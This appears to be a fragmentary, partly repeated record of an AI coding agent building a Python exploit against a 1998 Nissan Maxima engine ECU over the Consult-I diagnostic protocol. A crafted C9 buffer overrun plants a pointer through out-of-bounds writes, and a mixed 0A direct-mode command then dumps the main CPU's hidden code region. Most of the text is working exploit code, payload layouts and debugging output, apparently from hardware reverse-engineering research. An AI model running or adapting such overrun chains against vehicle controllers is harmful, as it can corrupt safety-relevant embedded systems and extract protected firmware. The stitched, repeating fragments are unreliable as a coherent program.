  "command": "python3 -I -c \"\nimport sys\nsys.path.insert(0, '.')\n\nCS_PAYLOAD    = 0x0740\nHIDDEN_ADDR   = 0x07C3\nHIDDEN_IDX    = 0x07D7\nHIDDEN_N      = 0x07E1\nREPLY_CURSOR  = 0x07E2\nFWD_FLAGS     = 0x07E3\nC9_SUB_VAL    = 0x07E7\nFORWARD_LO    = 0x5D40\nFORWARD_HI    = 0x623F\n\nall_pairs = [0x0281] + [0x5E50]*15 + [0x5E0F, 0x5E0B, 0x5E61, 0x5E60]\nprint(f'all_pairs len={len(all_pairs)}')\n\nram = {}\ndef rb(a): return ram.get(a, 0)\ndef wb(a, v): ram[a] = v & 0xFF\ndef rw(a): return rb(a) | (rb(a + 1) << 8)\ndef ww(a, v): wb(a, v & 0xFF); wb(a + 1, (v >> 8) & 0xFF)\n\ncs_argc = len(all_pairs) * 2\nfor i, a in enumerate(all_pairs):\n    ww(0x08D2 + 2 * i, a)\nwb(HIDDEN_N, 0)\nwb(FWD_FLAGS, rb(FWD_FLAGS) & ~0x03)\n\nfor i in range(20):\n    if 2 * i >= cs_argc:\n        break\n    a_val = rw(0x08D2 + 2 * i)\n    if not (FORWARD_LO <= a_val < 0x6240):\n        if 2 * (i + 1) >= cs_argc:\n            break\n        print(f'i={i}: skip {a_val:#06x}')\n        continue\n    wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x01)\n    n = rb(HIDDEN_N)\n    addr_idx = (2 * n) & 0xFF\n    dest = HIDDEN_ADDR + addr_idx\n    word = a_val - 0x5000\n    ww(dest, word)\n    n_re = rw(HIDDEN_N) & 0xFF\n    idx_dest = HIDDEN_IDX + n_re\n    wb(idx_dest, i & 0xFF)\n    wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)\n    if i >= 14:\n        print(f'i={i}: n={n} a={a_val:#06x} w={word:#06x} dest={dest:#06x} n_re={n_re} idx_dest={idx_dest:#06x} val={i}')\n    if 2 * (i + 1) >= cs_argc:\n        break\n\nprint()\nprint(f'n={rb(HIDDEN_N):#04x} cursor={rb(REPLY_CURSOR):#04x} flags={rb(FWD_FLAGS):#04x}')\nprint(f'idx[0E]={rb(HIDDEN_IDX+0x0E):#04x} idx[10]={rb(HIDDEN_IDX+0x10):#04x}')\nprint(f'c9_sub_value={rb(C9_SUB_VAL):#04x}')\nprint(f'07E5={rb(0x07E5):#04x} 07E7={rb(0x07E7):#04x}')\n\" 2>&1",
  "description": "Debug the mixed simulation to check idx values"
}

  "new_string": "def dry_run_mixed():\n    \"\"\"Show the mixed command layout.\"\"\"\n    print(f\"\\n--- Mixed command (0A + C9 overrun) ---\")\n    oa_bytes, c9_addrs = build_mixed_payload()\n    n_main = sum(1 for a in c9_addrs if a == c9_addrs[0])\n    print(f\"  0A args:    {oa_bytes.hex(' ')}\")\n    print(f\"  C9 addrs:   {len(c9_addrs)} ({n_main}×${c9_addrs[0]:04X} + \"\n          + \" \".join(f\"${a:04X}\" for a in c9_addrs[n_main:]) + \")\")\n    print(f\"  Total args: 2 + {len(c9_addrs)*2} = {2 + len(c9_addrs)*2} bytes (limit 40)\")\n\n    # Simulate the overrun as the ECU would see it (0A args at argbuf[0..1])\n    # The 0A arg bytes go into cs_argbuf as received: [fb=02, val=81].\n    # The M37732 reads 16-bit words little-endian, so pair 0 = $8102.\n    # But the simulation's ww/rw is self-consistent, so we pass the\n    # protocol-order value $0281 and it stays consistent.\n    all_pairs = [0x0281] + c9_addrs\n    ram = simulate_overrun_mixed(all_pairs)"

usage: c9_hidden_read.py [-h] [--dev DEV] [--addr ADDR] [--h8 H8] [--sweep]
                         [--mixed-only] [--frames FRAMES] [--dry-run]

c9_hidden_read: read the main CPU's hidden code at $5D40–$623F.

Chains the c9_find_hidden overrun (ROM_ANALYSIS.md §10) with the
consult_reply_direct streamlist dereference (ROM_ANALYSIS.md §11):

  1. PLANT: fire a crafted 20-address C9 overrun that places a chosen
     16-bit address into cs_streamlist ($07A0/$07A1) via the downstream
     OOB write.
  2. VERIFY: read $07A0–$07A3 via one-shot C9 to confirm the plant.
  3. READ (mixed command): send 0A direct-mode + 19 C9 overrun addrs
     in one payload.  The 0A handler loads cs_streamlist from ROM, then
     F0 fires the overrun; during streaming the downstream OOB writes
     overwrite cs_streamlist with our address while consult_reply_direct
     reads from it each frame.  After the plant frames, the direct
     builder dereferences our hidden-region pointer — reading the main
     CPU's own memory with no forwarding.

Phase 3 is the novel part: it avoids the "0A overwrites cs_streamlist"
problem by running the overrun and direct mode *simultaneously*.

Usage:
  python3 tools/c9_hidden_read.py --dry-run          # simulate only
  python3 tools/c9_hidden_read.py --sweep --dry-run   # show all targets
  python3 tools/c9_hidden_read.py                     # live: default addr
  python3 tools/c9_hidden_read.py --addr 6025         # live: specific addr

The 20-address plant uses the stale c9_sub_value trick (WRITE_PRIMITIVE.md):
  [0..14]  main_addr × 15
  [15]     $5E0F   (n=$10 after INC, cursor=$0E)
  [16]     $5E0B   (repair $07E3: lo=$0B, bits 0+1 set)
  [17]     $5Xhh   (idx[$0E]=hh, targets cs_payload[hh])
  [18]     $5Xvv   (c9_sub_value=vv, stale write value)
  [19]     $5Xll   (idx[$12]=ll, targets cs_payload[ll])

The mixed 19-address read uses an adapted layout (0A args take 2 argbuf
bytes, leaving room for 19 C9 addrs):
  0A 02 81  +  C9×19  +  F0
Cursor cycle: $0E,$0F,$10,$11,$12,0,1...
Frame 0: idx[$0E]=$61 → stale $60 → $07A1 (streamlist hi)
Frame 2: idx[$10]=$60 → H8 reply → $07A0 (streamlist lo)
After frame 2, cs_streamlist[0]=$60XX; the direct builder dereferences it.

SAFE: read-only exploit — writes to Consult handler state only.  No code
redirect.  Key cycle clears all corruption.

options:
  -h, --help       show this help message and exit
  --dev DEV        serial device (default: /dev/ttyUSB0)
  --addr ADDR      target hidden-region address in hex (default: auto from
                   sweep)
  --h8 H8          H8 dump for simulation (default: h8_clean.bin)
  --sweep          show all achievable target addresses
  --mixed-only     skip the plant+verify phases, run mixed command only

257	def sweep_plant_targets(h8_dump):
258	    """Find all hidden-region addresses achievable with the 20-address plant."""
259	    addr15 = 0x5E0F
260	    addr16 = 0x5E0B

262	    addr17_choices = [a for hp in range(0x0D, 0x13)

264	                      if FORWARD_LO <= a <= FORWARD_HI]
265	
266	    addr19_choices = [a for hp in range(0x0D, 0x13)
267	                      for a in [0x5000 + (hp << 8) + 0x60]
268	                      if FORWARD_LO <= a <= FORWARD_HI]
269	
270	    safe_los = [lo for lo in range(0x40, 0x60) if lo not in (0x60, 0x61)]
271	    safe_los += [lo for lo in range(0x62, 0x80)]
272	
273	    results = {}
274	    for target_hi in range(0x5D, 0x63):
275	        addr18_choices = [a for hp in range(0x0D, 0x13)
276	                          for a in [0x5000 + (hp << 8) + target_hi]
277	                          if FORWARD_LO <= a <= FORWARD_HI]
278	
279	        for addr18 in addr18_choices:
280	            for addr17 in addr17_choices:
281	                for addr19 in addr19_choices:

283	                        for hp in (0x0E, 0x0F, 0x10, 0x11, 0x12, 0x0D):
284	                            main = 0x5000 + (hp << 8) + lo
285	                            if not (FORWARD_LO <= main <= FORWARD_HI):

287	                            payload = [main] * 15 + [addr15, addr16, addr17, addr18, addr19]

333	def build_mixed_payload():
334	    """Build the 0A+C9 mixed command payload.
335	
336	    Returns (0A_bytes, c9_addr_list):

338	      c9_addr_list = 19 C9 addresses
339	
340	    The 0A args take 2 bytes of cs_argbuf (pair 0, skipped by c9_find_hidden).
341	    With 19 C9 addrs: total argc = 2 + 38 = 40 (at the limit).
342	
343	    Layout (14 main + 5 control): the 0A pair shifts i by 1, so we use
344	    14 main addresses (not 15) so that the first control addr lands at n=15
345	    where addr_store hits $07E1.  The 5th control is a dummy (main_addr).
346	
347	      idx[$0E]=$61 → frame 0 stale ($60) → $07A1
348	      idx[$10]=$60 → frame 2 H8 reply → $07A0
349	      Streamlist = $60XX after frame 2
350	    """

352	    addr16 = 0x5E0B

365	def read_c9(c, addrs):
366	    """Read addresses via C9 one-shot (max 8 per call)."""
367	    result = bytearray()
368	    for i in range(0, len(addrs), 8):
369	        chunk = addrs[i:i + 8]
370	        result += c.read_memory(chunk)
371	    return bytes(result)

374	def run_plant(c, payload, stop_frame, target_addr):
375	    """Phase 1: fire the 20-address overrun to plant cs_streamlist."""

393	
394	    c.stop(timeout=0.5)
395	    c.t.drain(quiet=0.05)

584	def simulate_overrun_mixed(all_pairs):
585	    """Simulate c9_find_hidden with cs_argbuf containing 0A args + C9 addrs."""
586	    ram = {}
587	    def rb(a): return ram.get(a, 0)
588	    def wb(a, v): ram[a] = v & 0xFF
589	    def rw(a): return rb(a) | (rb(a + 1) << 8)
590	    def ww(a, v): wb(a, v & 0xFF); wb(a + 1, (v >> 8) & 0xFF)
591	
592	    cs_argc = len(all_pairs) * 2
593	    for i, a in enumerate(all_pairs):

603	            if 2 * (i + 1) >= cs_argc:

607	        n = rb(HIDDEN_N)

609	        ww(HIDDEN_ADDR + addr_idx, a_val - 0x5000)
610	        n_re = rw(HIDDEN_N) & 0xFF
611	        wb(HIDDEN_IDX + n_re, i & 0xFF)
612	        wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)
613	        if 2 * (i + 1) >= cs_argc:
614	            break
615	    return ram

2. Key Technical Concepts:
   - **c9_find_hidden buffer overrun** ($543F): sending 16–20 C9 addresses in $5D40–$623F + F0 overflows `c9_hidden_addr` (10 entries × 2B at $07C3) and `c9_hidden_idx` (10 entries × 1B at $07D7), corrupting live Consult handler state
   - **Downstream OOB write** via `consult_reply_c9` ($9B3F): corrupted idx entries cause `cs_payload[idx] = c9_sub_value` to escape the 40-byte buffer, reaching $0740–$083F
   - **Stale c9_sub_value trick**: when $07E3 bits 0+1 are both set, the reply builder's first frame writes the stale `c9_sub_value` ($07E7) before any H8 reply arrives
   - **consult_reply_direct** ($9CDD): dereferences `cs_streamlist` entries as raw bank-0 addresses with NO range check and NO forwarding — reads main CPU memory directly
   - **Critical problem discovered**: 0A direct mode OVERWRITES cs_streamlist ($07A0-$07A3) via three stores at $5224/$5327/$5331 before reading it, so the naive chain (plant → re-init → 0A) doesn't work
   - **Mixed command solution**: send `0A 02 81` + `C9×19` + `F0` in one payload. The 0A handler loads cs_streamlist from ROM, then F0 triggers the overrun. During streaming, the C9 builder's downstream OOB writes overwrite cs_streamlist while consult_reply_direct reads from it — after frame 2, the direct builder dereferences our hidden-region pointer
   - **idx_store cascade bug**: at i=11 in the overrun loop (when n=10), idx_store writes to $07D7+10=$07E1 (HIDDEN_N), adding 1 extra to n. This means n reaches 15 one iteration earlier than naively expected
   - **M37732/M7700 CPU** with H8/3437 second CPU linked via shared RAM
   - **Consult-I protocol**: FF FF ED init, command echo (~cmd + args), F0 start streaming, 30 stop, FF <len> <data> frames
   - **cs_argbuf limit**: 40 bytes. 0A takes 2 args + 19 C9 × 2 bytes = 40 total (at the limit)

3. Files and Code Sections:

   - **tools/c9_hidden_read.py** (CREATED — the main deliverable)
     - Implements the full chain: overrun → plant streamlist → simultaneous direct-mode read
     - Three phases: PLANT (20-addr C9 overrun), VERIFY (C9 read of $07A0), MIXED READ (0A+C9 simultaneous)
     - Has --dry-run, --sweep, --addr, --mixed-only, --frames, --h8, --dev flags
     - Key layout for mixed command (14 main + 5 control):
       ```
       0A 02 81 + C9×19 + F0
       c9_addrs = [main]*14 + [$5E0F, $5E0B, $5E61, $5E60, main]
       ```
     - Frame 0: idx[$0E]=$61 → stale $60 → $07A1 (streamlist hi)
     - Frame 2: idx[$10]=$60 → H8 reply → $07A0 (streamlist lo)
     - After frame 2: streamlist[0] = $60XX, direct builder dereferences it
     - Plant payload for standalone verification uses 20 addresses:
       ```
       [main]*15 + [$5E0F, $5E0B, addr17, addr18, addr19]
       ```
     - Sweep finds 45 achievable hidden-region addresses with h8_clean.bin
     - Safety prompt before live execution (key on, engine off)
     - Includes baseline 0A direct-mode capture for frame format comparison

   - **consult/protocol.py** (read, not modified)

     - `ENGINE_IDS = (0xED, 0xEF)` — the 1998 Maxima answers ED
     - `NARGS = {0x5A: 1, 0xC9: 2, 0x0A: 2}` — 0A takes 2 arg bytes

4. Errors and Fixes:
   - **Mixed command simulation producing wrong idx values**:
     - Symptom: idx[$0E]=$0E (should be $61), idx[$10]=$00 (should be $60), n=$55, flags=$0D
     - Root cause: with 15 main addresses + 0A pair at position 0, the idx_store cascade at i=11 (n=10 → writes to $07E1 → adds 1 to n) makes n reach 15 at i=15. At i=15, the LAST main address (not the first control) hits the addr_store to $07E1, writing $50 (from $5E50-$5000=$0E50, lo=$50) instead of $0F
     - Debug trace confirmed: i=15 had n=15 and a=$5E50 (main), writing $50 to $07E1, causing n to spiral to $51=81 and all subsequent writes to go to wrong addresses
     - Fix: changed from 15 main + 4 control to **14 main + 5 control** (5th control = dummy main_addr). With 14 main addresses (i=1..14), n reaches 15 after the cascade, and the first control ($5E0F) lands correctly at i=15 with n=15
     - Verified: idx[$0E]=$61, idx[$10]=$60, c9_sub_value=$60, flags=$0B ✓

   - **Sweep finding only 15 targets instead of 45**:
     - Cause: initial sweep used limited search space (only first addr17/addr19 choice, limited main_addr pages)
     - Fix: widened search to iterate all addr17_choices, all addr19_choices, more main_addr lo bytes and hi pages
     - Result: 45 targets found, matching original chain_sweep.py

   - **Auto-select picking unresolvable target**:
     - Symptom: auto-selected $5D80 but build_plant_payload couldn't find a payload for it
     - Cause: sweep_plant_targets and build_plant_payload use different search strategies
     - Fix: auto-select now iterates sweep results and picks the first one that build_plant_payload can actually solve ($5E25)

c9_hidden_read: read the main CPU's hidden code at $5D40–$623F.

Chains the c9_find_hidden overrun (ROM_ANALYSIS.md §10) with the
consult_reply_direct streamlist dereference (ROM_ANALYSIS.md §11):

  1. PLANT: fire a crafted 20-address C9 overrun that places a chosen

     in one payload.  The 0A handler loads cs_streamlist from ROM, then
     F0 fires the overrun; during streaming the downstream OOB writes
     overwrite cs_streamlist with our address while consult_reply_direct
     reads from it each frame.  After the plant frames, the direct
     builder dereferences our hidden-region pointer — reading the main
     CPU's own memory with no forwarding.

Phase 3 is the novel part: it avoids the "0A overwrites cs_streamlist"
problem by running the overrun and direct mode *simultaneously*.

  [16]     $5E0B   (repair $07E3: lo=$0B, bits 0+1 set)
  [17]     $5Xhh   (idx[$0E]=hh, targets cs_payload[hh])
  [18]     $5Xvv   (c9_sub_value=vv, stale write value)
  [19]     $5Xll   (idx[$12]=ll, targets cs_payload[ll])

Frame 2: idx[$10]=$60 → H8 reply → $07A0 (streamlist lo)
After frame 2, cs_streamlist[0]=$60XX; the direct builder dereferences it.

SAFE: read-only exploit — writes to Consult handler state only.  No code
redirect.  Key cycle clears all corruption.

Step 3 is the big one. What to watch for:

- **Plant verify fails** (C9 read of $07A0 doesn't match) — overrun timing issue, or H8 values differ from the dump. Re-dump H8 with `c9_h8_dump.py` and retry with `--h8 <new_dump>`
- **Mixed command echo rejected** — the ECU might not accept 0A + C9 in one payload. The log will show exactly what echo came back vs expected
- **No extra bytes in frames** — the direct builder might not run during C9 streaming. Frames will be normal C9-only size. This is the key unknown
- **Extra bytes appear but wrong values** — the direct builder runs but streamlist wasn't planted yet at that frame. Increase `--frames` and look at later frames

6	import time

8	ENGINE = 0xEF
9	ENGINE_ALT = 0xED               # the 1998 Maxima's engine ECU answers ED (reply 12), not EF
10	ENGINE_IDS = (ENGINE_ALT, ENGINE)
11	STOP = 0x30
12	GO = 0xF0
13	STOP_ACKS = (0xCF, 0xFE)        # both seen on the A32 (CONSULT_PROTOCOL.md §3, rule 7)
14	ACTIVE = 0x0A
15	
16	# Number of argument bytes that follow each command byte (echoed verbatim).
17	NARGS = {0x5A: 1, 0xC9: 2, 0x0A: 2}

20	class ConsultError(IOError):
21	    pass
22	
23	
24	def expected_echo(payload: bytes) -> bytes:
25	    out = bytearray()
26	    i = 0
27	    while i < len(payload):
28	        cmd = payload[i]
29	        n = NARGS.get(cmd, 0)
30	        out.append(~cmd & 0xFF)
31	        out += payload[i + 1:i + 1 + n]
32	        i += 1 + n
33	    return bytes(out)

36	class Consult:
37	    def __init__(self, transport):
38	        self.t = transport
39	
40	    def stop(self, timeout=2.0):
41	        """Send 30 and read until a stop ack. Returns (ack byte or None, bytes before it).
42	
43	        Whole frames are skipped by length, so a data byte that happens to be CF or FE
44	        isn't taken for the ack. Only whole frames come before the ack (checklist 1.5).
45	        """
46	        self.t.write(bytes([STOP]))
47	        self._frame_started = False
48	        before = bytearray()
49	        end = time.monotonic() + timeout
50	        while time.monotonic() < end:
51	            b = self.t.read(1, timeout=0.3)
52	            if not b:
53	                continue
54	            before += b
55	            if b[0] == 0xFF:
56	                n = self.t.read(1, timeout=0.3)
57	                before += n
58	                if n:
59	                    before += self.t.read(n[0], timeout=0.3)
60	                continue
61	            if b[0] in STOP_ACKS:
62	                return b[0], bytes(before[:-1])
63	        return None, bytes(before)
64	
65	    def init(self, ecu=ENGINE_IDS, tries=5, wait=2.0, pre_stop=True, gaps=(0.28, 0.07)):
66	        """Send FF FF <ecu> until ~ecu (10 for EF, 12 for ED) comes back.
67	
68	        `ecu` is one ID or a sequence of IDs tried in turn on each attempt. The
69	        default tries ED first and then EF: the 1998 Maxima answers ED. After a
70	        wrong-ID init the ECU ignores everything, including 30, until it gets a
71	        correct init.
72	
73	        `gaps` are the pauses after the first and second FF. ECUTalk 1.5.0 sends the
74	        three bytes separately with Sleep(Delay1=280 ms) and Sleep(Delay2=70 ms) in
75	        between (decompiled from ECUTalk). Pass gaps=None to send them back to back.
76	
77	        Returns (attempt number, seconds from TX to the reply, other bytes seen, id)
78	        on success, or None.
79	        """
80	        ids = (ecu,) if isinstance(ecu, int) else tuple(ecu)
81	        for n in range(tries * len(ids)):
82	            attempt, ecu = n // len(ids) + 1, ids[n % len(ids)]
83	            if pre_stop:
84	                self.stop(timeout=0.5)
85	                self.t.drain(quiet=0.2)
86	            if gaps:
87	                self.t.write(b"\xFF")
88	                time.sleep(gaps[0])
89	                self.t.write(b"\xFF")
90	                time.sleep(gaps[1])
91	                self.t.write(bytes([ecu]))
92	            else:
93	                self.t.write(bytes([0xFF, 0xFF, ecu]))
94	            sent = time.monotonic()
95	            junk = bytearray()
96	            while time.monotonic() - sent < wait:
97	                b = self.t.read(1, timeout=0.2)

100	                if b[0] == 0xFF:

104	                    n = self.t.read(1, timeout=0.2)
105	                    junk += b + n
106	                    if n:
107	                        junk += self.t.read(n[0], timeout=0.2)
108	                    continue
109	                if b[0] == ~ecu & 0xFF:
110	                    self.ecu = ecu
111	                    return attempt, time.monotonic() - sent, bytes(junk), ecu
112	                junk += b
113	        return None
114	
115	    def command(self, payload: bytes, retries=2):
116	        """Send a command list, check the echo, then send F0 to start streaming.
117	
118	        The 1998 Maxima (seen 2026-11-14) sometimes answers a valid command with FE FE
119	        in place of the first echo pair, and sometimes echoes it correctly but answers
120	        F0 with FE and sends no frames. Both are retried after a stop.
121	        """

140	    @property
141	    def paced(self):
142	        # The BCM (DA) answers FE to a command list sent in one burst, but accepts the
143	        # same bytes sent one at a time, each after its echo (2026-11-14).
144	        return getattr(self, "ecu", ENGINE) not in ENGINE_IDS
145	
146	    def _send(self, payload, want):
147	        if not self.paced:
148	            self.t.write(payload)
149	            return self.t.read(len(want), timeout=0.5)
150	        got = bytearray()
151	        for i, b in enumerate(payload):
152	            self.t.write(bytes([b]))
153	            e = self.t.read(1, timeout=0.3)
154	            got += e
155	            if e != want[i:i + 1]:
156	                break
157	        return bytes(got)
158	
159	    def read_frame(self, expected_len=None, timeout=1.0) -> bytes:
160	        """Read one FF <n> <data...> frame, parsing by length (data may contain FF)."""
161	        end = time.monotonic() + timeout
162	        while time.monotonic() < end:
163	            if getattr(self, "_frame_started", False):
164	                self._frame_started = False
165	            else:
166	                b = self.t.read(1, timeout=timeout)
167	                if not b:
168	                    break
169	                if b[0] != 0xFF:
170	                    continue
171	            n = self.t.read(1, timeout=0.3)
172	            if not n:
173	                break
174	            n = n[0]
175	            if expected_len is not None and n != expected_len:
176	                continue
177	            data = self.t.read(n, timeout=0.3)
178	            if len(data) == n:
179	                return data
180	        raise TimeoutError("no frame")
181	
182	    def one_shot(self, payload: bytes, expected_len=None) -> bytes:
183	        """Command, read a single frame, stop."""
184	        self.command(payload)
185	        try:
186	            return self.read_frame(expected_len)
187	        finally:
188	            self.stop()
189	
190	    def read_registers(self, regs):
191	        return b"".join(bytes([0x5A, r]) for r in regs)
192	
193	    def part_number(self):
194	        d = self.one_shot(bytes([0xD0]))
195	        pn = None
196	        tail = d[-5:]
197	        engine = getattr(self, "ecu", ENGINE) in ENGINE_IDS
198	        if len(d) >= 5 and all(0x30 <= b < 0x5B for b in tail):
199	            # 1998 Maxima: frame ending in ASCII, e.g. "2L904" = 23710-2L904. Only the
200	            # engine ECU is known to be 23710-; other units get the bare suffix.
201	            pn = ("23710-" if engine else "?-") + tail.decode("ascii")
202	        elif engine and len(d) >= 22:
203	            pn = f"{d[2]:02X}{d[3]:02X} 23710-{d[19]:X}{d[20]:02X}{d[21]:02X}"
204	        return d, pn
205	
206	    def read_memory(self, addrs):
207	        """C9: one byte from each address (1..8 per request, CONSULT_PROTOCOL.md §4)."""

217	    def active_test(self, test, value, hold=5.0, on_rx=None):
218	        """Send 0A <test> <value> F0, hold for `hold` seconds, then stop (30).
219	
220	        No retries: a bad echo stops and raises. The stop is sent whatever happens,
221	        including Ctrl-C, and resent up to 3 times if it isn't acknowledged.
222	        `on_rx(bytes)` is called with whatever the ECU sends during the hold.
223	
224	        Returns (bytes received during the hold, stop ack or None).
225	        """

227	        want = expected_echo(payload)
228	        got = bytearray()

231	            if echo != want:
232	                raise ConsultError(f"bad echo {echo.hex(' ') or '(none)'}, expected {want.hex(' ')}")
233	            self.t.write(bytes([GO]))
234	            self.t.note(f"active test {test:02X}={value:02X} on, holding {hold:.1f} s")
235	            end = time.monotonic() + hold
236	            while time.monotonic() < end:
237	                chunk = self.t.read(64, timeout=0.2)
238	                if chunk:
239	                    got += chunk
240	                    if on_rx:
241	                        on_rx(chunk)
242	        finally:
243	            ack = None
244	            for _ in range(3):
245	                ack, _ = self.stop()

247	                    break
248	            self.t.note(f"active test {test:02X} stopped, ack {ack if ack is None else f'{ack:02X}'}")
249	        return bytes(got), ack

244	                if frame > stop_frame:
245	                    if target == CS_STREAMLIST + 1 and value != sl_hi:
246	                        clobbered = True
247	                    if target == CS_STREAMLIST and value != sl_lo:
248	                        clobbered = True
249	            if clobbered:
250	                continue
251	
252	            return payload, stop_frame
253	
254	    return None
255	
256	
257	def sweep_plant_targets(h8_dump):
258	    """Find all hidden-region addresses achievable with the 20-address plant."""
259	    addr15 = 0x5E0F
260	    addr16 = 0x5E0B
261	
262	    addr17_choices = [a for hp in range(0x0D, 0x13)
263	                      for a in [0x5000 + (hp << 8) + 0x61]
264	                      if FORWARD_LO <= a <= FORWARD_HI]
265	
266	    addr19_choices = [a for hp in range(0x0D, 0x13)
267	                      for a in [0x5000 + (hp << 8) + 0x60]
268	                      if FORWARD_LO <= a <= FORWARD_HI]
269	
270	    safe_los = [lo for lo in range(0x40, 0x60) if lo not in (0x60, 0x61)]
271	    safe_los += [lo for lo in range(0x62, 0x80)]
272	
273	    results = {}
274	    for target_hi in range(0x5D, 0x63):
275	        addr18_choices = [a for hp in range(0x0D, 0x13)
276	                          for a in [0x5000 + (hp << 8) + target_hi]
277	                          if FORWARD_LO <= a <= FORWARD_HI]
278	
279	        for addr18 in addr18_choices:
280	            for addr17 in addr17_choices:
281	                for addr19 in addr19_choices:
282	                    for lo in safe_los:
283	                        for hp in (0x0E, 0x0F, 0x10, 0x11, 0x12, 0x0D):
284	                            main = 0x5000 + (hp << 8) + lo
285	                            if not (FORWARD_LO <= main <= FORWARD_HI):
286	                                continue
287	                            payload = [main] * 15 + [addr15, addr16, addr17, addr18, addr19]
288	                            ram = simulate_overrun(payload)
289	                            flags = ram.get(FWD_FLAGS, 0)
290	                            if (flags & 0x03) != 0x03:
291	                                continue
292	                            writes = simulate_builder(dict(ram), h8_dump, 12)
293	
294	                            sl_hi = sl_lo = None
295	                            sf_hi = sf_lo = -1
296	                            for f, t, v in writes:
297	                                if t == CS_STREAMLIST + 1 and sl_hi is None:
298	                                    sl_hi = v; sf_hi = f
299	                                if t == CS_STREAMLIST and sl_lo is None:
300	                                    sl_lo = v; sf_lo = f
301	
302	                            if sl_hi is None or sl_lo is None:
303	                                continue
304	                            addr = (sl_hi << 8) | sl_lo
305	                            if not (0x5D40 <= addr <= 0x623F):
306	                                continue
307	                            stop = max(sf_hi, sf_lo)
308	
309	                            ok = True
310	                            for f, t, v in writes:
311	                                if f > stop:
312	                                    if t == CS_STREAMLIST + 1 and v != sl_hi:
313	                                        ok = False
314	                                    if t == CS_STREAMLIST and v != sl_lo:
315	                                        ok = False
316	                            if not ok:
317	                                continue
318	
319	                            if addr not in results:
320	                                results[addr] = (main, addr17, addr18, addr19,
321	                                                 sl_hi, sl_lo, sf_hi, sf_lo, stop)
322	                            break  # found one main for this combo, move on
323	                        else:
324	                            continue
325	                        break  # found one, skip remaining hp choices
326	    return results
327	
328	
329	# ---------------------------------------------------------------------------
330	# 19-address mixed payload (for Phase 3: simultaneous read)
331	# ---------------------------------------------------------------------------
332	
333	def build_mixed_payload():
334	    """Build the 0A+C9 mixed command payload.
335	
336	    Returns (0A_bytes, c9_addr_list):
337	      0A_bytes = bytes([0x0A, 0x02, 0x81])  (direct mode, fb=2 val=$81)
338	      c9_addr_list = 19 C9 addresses
339	
340	    The 0A args take 2 bytes of cs_argbuf (pair 0, skipped by c9_find_hidden).
341	    With 19 C9 addrs: total argc = 2 + 38 = 40 (at the limit).
342	
343	    Layout (14 main + 5 control): the 0A pair shifts i by 1, so we use
344	    14 main addresses (not 15) so that the first control addr lands at n=15
345	    where addr_store hits $07E1.  The 5th control is a dummy (main_addr).
346	
347	      idx[$0E]=$61 → frame 0 stale ($60) → $07A1
348	      idx[$10]=$60 → frame 2 H8 reply → $07A0
349	      Streamlist = $60XX after frame 2
350	    """
351	    addr15 = 0x5E0F
352	    addr16 = 0x5E0B
353	    addr17 = 0x5E61  # idx[$0E] = $61
354	    addr18 = 0x5E60  # c9_sub_value = $60, idx[$10] = $60
355	    main_addr = 0x5E50  # safe lo=$50, avoids $60/$61
356	
357	    c9_addrs = [main_addr] * 14 + [addr15, addr16, addr17, addr18, main_addr]
358	    return bytes([0x0A, 0x02, 0x81]), c9_addrs
359	
360	
361	# ---------------------------------------------------------------------------
362	# Live execution
363	# ---------------------------------------------------------------------------
364	
365	def read_c9(c, addrs):
366	    """Read addresses via C9 one-shot (max 8 per call)."""
367	    result = bytearray()
368	    for i in range(0, len(addrs), 8):
369	        chunk = addrs[i:i + 8]
370	        result += c.read_memory(chunk)
371	    return bytes(result)
372	
373	
374	def run_plant(c, payload, stop_frame, target_addr):
375	    """Phase 1: fire the 20-address overrun to plant cs_streamlist."""
376	    n_addrs = len(payload)
377	    n_frames = stop_frame + 2  # a couple extra for safety
378	
379	    print(f"\n--- Phase 1: PLANT (target ${target_addr:04X}) ---")
380	    print(f"  Sending {n_addrs} C9 addresses + F0...")
381	
382	    cmd = b"".join(bytes([0xC9, a >> 8, a & 0xFF]) for a in payload)
383	    c.command(cmd)
384	    c.t.note(f"plant sent: {n_addrs} addrs, target=${target_addr:04X}")
385	
386	    frames = []
387	    try:
388	        for _ in range(n_frames):
389	            f = c.read_frame(timeout=1.0)
390	            frames.append(f)
391	    except TimeoutError:
392	        pass
393	
394	    c.stop(timeout=0.5)
395	    c.t.drain(quiet=0.05)
396	    print(f"  Streamed {len(frames)} frames, stopped.")
397	    return frames
398	
399	
400	def run_verify(c, target_addr):
401	    """Phase 2: read cs_streamlist via C9 to confirm the plant."""
402	    print(f"\n--- Phase 2: VERIFY ---")
403	    sl = read_c9(c, [CS_STREAMLIST, CS_STREAMLIST + 1,
404	                      CS_STREAMLIST + 2, CS_STREAMLIST + 3])
405	    word0 = sl[0] | (sl[1] << 8)
406	    word1 = sl[2] | (sl[3] << 8)
407	    print(f"  cs_streamlist[0] = ${word0:04X}  (${sl[1]:02X} ${sl[0]:02X})")
408	    print(f"  cs_streamlist[1] = ${word1:04X}  (${sl[3]:02X} ${sl[2]:02X})")
409	
410	    if word0 == target_addr:
411	        print(f"  PLANT CONFIRMED: streamlist[0] = ${target_addr:04X}")
412	    else:
413	        print(f"  PLANT MISMATCH: expected ${target_addr:04X}, got ${word0:04X}")
414	
415	    return word0, word1
416	
417	
418	def run_mixed(c, n_frames=12):
419	    """Phase 3: mixed 0A+C9 command — overrun + direct mode simultaneously."""
420	    print(f"\n--- Phase 3: MIXED READ (0A direct + C9 overrun) ---")
421	
422	    oa_bytes, c9_addrs = build_mixed_payload()
423	    n_c9 = len(c9_addrs)
424	
425	    # Build the full command payload: 0A 02 81 C9 xx xx ... (×19)
426	    cmd = bytearray(oa_bytes)
427	    for a in c9_addrs:
428	        cmd += bytes([0xC9, a >> 8, a & 0xFF])
429	    cmd = bytes(cmd)
430	
431	    print(f"  Sending 0A 02 81 + {n_c9}×C9 + F0...")
432	    print(f"  (0A activates direct mode; C9 overrun plants streamlist during streaming)")
433	
434	    c.command(cmd)
435	    c.t.note(f"mixed cmd sent: 0A+{n_c9}xC9")
436	
437	    frames = []
438	    try:
439	        for _ in range(n_frames):
440	            f = c.read_frame(timeout=1.0)  # don't constrain length — unknown format
441	            frames.append(f)
442	    except TimeoutError:
443	        pass
444	
445	    c.stop(timeout=0.5)
446	    c.t.drain(quiet=0.05)
447	
448	    print(f"  Streamed {len(frames)} frames.")
449	    print(f"\n  Raw frames:")
450	    for i, f in enumerate(frames):
451	        hex_str = " ".join(f"{b:02X}" for b in f)
